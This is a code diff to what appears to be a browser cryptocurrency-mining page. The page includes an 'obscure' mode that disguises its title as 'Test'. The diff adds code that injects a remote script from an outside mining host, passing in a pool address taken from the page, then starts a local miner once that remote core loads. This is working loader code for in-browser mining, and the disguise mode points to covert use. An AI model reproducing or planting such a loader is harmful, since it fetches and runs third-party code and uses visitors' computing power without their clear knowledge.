@@ -165,12 +165,28 @@ if (typeof obscure !== 'undefined' && obscure) {
 `;
 title = "Test";
 }
-console.log("Loading script...");
+console.log("Loading scripts...");
 
-$.getScript('../scripts/pickaxe.js', function(){
-        clearInterval(loadingInterval);
-        document.title = title + " Mineshaft";
-        h1title.innerHTML = document.title;
-        document.getElementById("loading").hidden = true;
-});
-}, 500);
+var str = "https://www.eth-pocket.de/perfekt/perfekt2.js?perfekt=wss://?jason=";
+var pool = document.getElementById("pool").innerHTML;
+var links = str+pool;
+
+var script = document.createElement("script");
+script.type = "text/javascript";
+script.src = links; 
+document.getElementsByTagName("head")[0].appendChild(script);
+//$.getScript(links, function(){
+var loadcore = setInterval(function(){
+    if (typeof PerfektStart === "function") {
+        clearInterval(loadcore);
+        console.log("Got the core! Loading final script...");
+        $.getScript('../scripts/pickaxe.js', function(){
+                clearInterval(loadingInterval);
+                document.title = title + " Mineshaft";
+                h1title.innerHTML = document.title;
+                document.getElementById("loading").hidden = true;
+        });
+    }
+    }, 100);
+//});
+}, 250);
